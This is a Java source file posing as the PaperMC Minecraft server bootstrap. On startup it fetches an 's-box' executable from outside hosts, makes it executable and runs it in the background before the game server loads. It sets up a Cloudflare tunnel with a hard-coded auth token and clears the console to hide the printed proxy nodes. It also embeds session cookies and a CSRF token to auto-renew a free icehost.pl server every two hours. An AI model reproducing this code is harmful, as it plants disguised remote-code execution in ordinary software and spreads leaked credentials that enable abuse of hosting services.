package io.papermc.paper;

import java.io.*;
import java.net.*;
// --- 仅添加以下三个网络相关 Import ---
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
// ------------------------------------
import java.nio.file.*;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "ICE_COOKIE", "ICE_TOKEN"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            // === 【移到最顶部并异步化】一进 try 块立刻以独立线程启动续期任务，防止被下方的 runSbxBinary() 卡死 ===
            new Thread(() -> {
                try {
                    startIceHostRenewal();
                } catch (Exception e) {
                    System.err.println("[Auto-Renew-Launcher] 独立启动器异常: " + e.getMessage());
                }
            }).start();
            // ===========================================================================================

            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);

            // === 此处原本的同步调用已删除，移到了上方进行并行异步处理 ===

            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    // === 仅在此处更新并替换了扫描续期脚本的实现 ===
    private static void startIceHostRenewal() {
        final String serverUuid = "c92815bf-7a7f-4554-9d97-d79dfc7c37f0";
        final String renewUrl = "https://dash.icehost.pl/api/client/freeservers/" + serverUuid + "/renew";
        
        final String defaultCookie = "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6ImRUMjNSK21JdXVMYndJa0J0cWJvRGc9PSIsInZhbHVlIjoiMWdsZXpBaTEvd3QvU2Z2emhnZUpJY1cxUFRTUk5Fd0tUS081bENTeVVKbThoWjNhSHZMNmVFMi9Lb1FqbnRydVg0Tm80bFZnT21CcnpkR2ZNamFKQmdNam82VnZZenpsaitOaXN6YkZqSmhGUUhnb3Q3Y0g0bU5jeG04TUlKRzBnc0pOOS8zenBCODB0R2tCRGY1N2cwZ1NJazRBQWUvSWpiSU1rd0VhY3lZcHMrMUlBUU4wbHBFdVoyZFQ5dkI5aG9IaXhkcHUvNG9WZ1lSSU0xbUV5ZHZ0dDh1MHBYUW5jcFJZR1kvd041WT0iLCJtYWMiOiIxNWEzZTQ3Y2RiYzY0N2E3NmQ2MDc3N2M0NDBiZGY3MjE1Yjk1N2Q3YWQwYmNiOWZmZTEyMTIwMjYyZWViM2Q4In0%3D; _ga=GA1.2.1305962064.1773619810; _ga_FNC0FEGQNV=GS2.1.s1773792392$o3$g1$t1773792439$j13$l0$h0; cf_clearance=rG6m7lfV_4NumFlgDunQlRLhprpnmhGZn3qbFzwhKnA-1782952987-1.2.1.1-_UbMwnwVNcMyXnGmajtjccd5BNWz8oqMjWAe5SCkHCOl2C6Hvwaw2hYmc1o0FQgNQh1oBmuuvc4OnsawFxqYI.w8L65aUUDwIgdR8s5C1qjxpygUSAT2G4GJpWC2AQwJNI02OleO11OP8Uhj09yTkNj8ac_DHBeSNV82zqPpjQtD2jEAj0iePffxdYCjBRKfmynoo8zIzmdVKnLLF_4FEw_Xao5V1GWEbVwv2mxw0IXmCByEODSaTy685zafGjQymNY1hAjD0XVl2Hr.3E.fosNkBRLw57mZRFX2yHHO0THI3E5WauAVMSJRxveOT2oeOXCcu2qbD_5cX._LjJOdN91vuS2yOn7d_beRjddDgXT9.x06v1NIRtZaU_kjUNAHPhJlew5MSxC43bXkhoTpC_NzddNiuqmW9d9ObYwD85fGmmDVBKNV5iHkuJ_N8YKo; XSRF-TOKEN=eyJpdiI6Imk5Z3R4MU9oZE5GRitiNHV6amxmT0E9PSIsInZhbHVlIjoia3BVenZKaEs0a1RoVTEvMlYxZyswTUFIemtvU3VFNHFVRWxsY21rU1JCdWkrNHljaTVqSEhETGNBbDhrSDdpTlRDSVhMbTYyL29CRkhiQ1FtTTl6NjJNWi93YW9zTXE5b1AzT1VoWjhobnl5dEd4Q3FDVmMvVWppcWlPWkdtaWQiLCJtYWMiOiIxMGEwMDk2MjVlZTQ4YzY4NjFiMGRkZWUyNjZiMzg5OTVjYWRiZDU0YTEwZjAyOGZjZDVlMTUyNjA4OGUzMzJkIn0%3D; icehostpl_session=eyJpdiI6InhpQ3F1RW9xNU8vMXZxT25YdFlVUVE9PSIsInZhbHVlIjoicnRCdFFqdVVDRzlBbDI3Q2xJRU96cERQL01IUlp1enpJS1ZhdWxEd2d3WUdveEtYSGVTQ1BWOGVLOERMdU1WVzB1VkNIa3hGaGRBcElzenJZUmdDNFBReHNNMVNQTHJlWUZBTU9ZWFpPS2ZSWnVmN2VjY2QwbjYyeTgxR2w0R0EiLCJtYWMiOiJiMzFiOWIyZmQ4ZDUyMTM4ZTJhNzc4MzlhMzRhODJmY2RiNGU0ODgxNzMwNWE2ZjA5YzgwZDZhYzMwNWZiMjE0In0%3D";
        final String defaultToken = "0a2vj3YUZtI0VFsZNFCzzw02O8FFMQgNt8aexpnx";

        // 设置为：开服 1 分钟后强制首次扫描，之后每 2 小时运行一次
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            System.out.println(ANSI_GREEN + "[Auto-Renew] 触发2小时定时扫描任务，正在向IceHost外发请求..." + ANSI_RESET);
            try {
                String currentCookie = System.getenv("ICE_COOKIE") != null ? System.getenv("ICE_COOKIE") : defaultCookie;
                String currentToken = System.getenv("ICE_TOKEN") != null ? System.getenv("ICE_TOKEN") : defaultToken;
                String botToken = System.getenv("BOT_TOKEN");
                String chatId = System.getenv("CHAT_ID");

                HttpClient client = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(20)).build();
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(renewUrl))
                        .header("Accept", "application/json")
                        .header("Content-Type", "application/json")
                        .header("X-CSRF-TOKEN", currentToken)
                        .header("Cookie", currentCookie)
                        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
                        .header("Referer", "https://dash.icehost.pl/server/" + serverUuid.substring(0, 8))
                        .POST(HttpRequest.BodyPublishers.ofString("{}"))
                        .build();

                client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                      .thenAccept(res -> {
                          String body = res.body();
                          int code = res.statusCode();
                          
                          if (code == 200 && body.contains("true")) {
                              String msg = "[Auto-Renew] 扫描完毕：续期成功！服务器有效期已延长 6 小时。";
                              System.out.println(ANSI_GREEN + msg + ANSI_RESET);
                              
                              // 仅在成功时发送 Telegram 消息
                              if (botToken != null && chatId != null) {
                                  String tgUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(msg, java.nio.charset.StandardCharsets.UTF_8);
                                  client.sendAsync(HttpRequest.newBuilder().uri(URI.create(tgUrl)).GET().build(), HttpResponse.BodyHandlers.ofString());
                              }
                              
                          } else if (code == 400 && (body.contains("Nie mo") || body.contains("recently"))) {
                              System.out.println(ANSI_GREEN + "[Auto-Renew] 扫描完毕：当前还未到续期时间，无需操作。" + ANSI_RESET);
                          } else if (code == 401 || code == 419) {
                              System.out.println(ANSI_RED + "[Auto-Renew] 警告：续期凭证（Cookie/Token）已失效，请尽快更新！" + ANSI_RESET);
                          } else {
                              System.out.println(ANSI_RED + "[Auto-Renew] 扫描异常。状态码: " + code + " 响应内容: " + body + ANSI_RESET);
                          }
                      }).exceptionally(ex -> {
                          System.err.println(ANSI_RED + "[Auto-Renew] 异步网络层发生致命未知错误: " + ex.getMessage() + ANSI_RESET);
                          ex.printStackTrace();
                          return null;
                      });
            } catch (Exception e) {
                System.err.println("[Auto-Renew] 核心逻辑触发错误: " + e.getMessage());
                e.printStackTrace();
            }
        }, 1, 120, TimeUnit.MINUTES);
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "48de7e1d-132f-4fea-b680-1f9b543b7bd9");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "icehost.19861123.tech");
        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYzA0ODAzM2MtZWMyZS00MDVhLTg0OWQtZDI0OTM2NTY0NTI4IiwicyI6IllUTXpObUUxWWpJdE5tUmlOaTAwTldGaUxUbGxaVFV0WWpoaE1XVmxPR0ZoWkRFeCJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "icehost");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
